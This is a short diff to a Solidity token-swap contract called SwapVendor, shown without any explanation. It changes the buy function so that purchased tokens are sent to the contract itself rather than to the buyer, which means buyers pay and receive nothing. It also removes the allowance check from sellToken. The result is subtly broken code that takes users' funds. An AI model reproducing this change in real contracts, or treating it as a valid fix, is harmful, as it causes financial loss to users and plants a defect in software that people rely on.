@@ -43,7 +43,7 @@ contract SwapVendor {
         uint256 curBalance = ERC20(token).balanceOf(address(this));
         require(curBalance > 0, "Current token balance 0!");
 
-        ERC20(token).transfer(msg.sender, amountToBuy);
+        ERC20(token).transfer(address(this), amountToBuy);
     }
 
     function sellToken(address token, uint amount) public payable {
@@ -52,9 +52,6 @@ contract SwapVendor {
 
         uint256 contractBalance = ERC20(token).balanceOf(address(this));
         require(contractBalance > 0, "Liquidity equals 0!");
-
-        uint allowance = ERC20(token).allowance(msg.sender, address(this));
-        require(allowance >= amount, "Check allowance!");
 
         ERC20(token).transferFrom(msg.sender, address(this), amount);
         payable(msg.sender).transfer(amount);
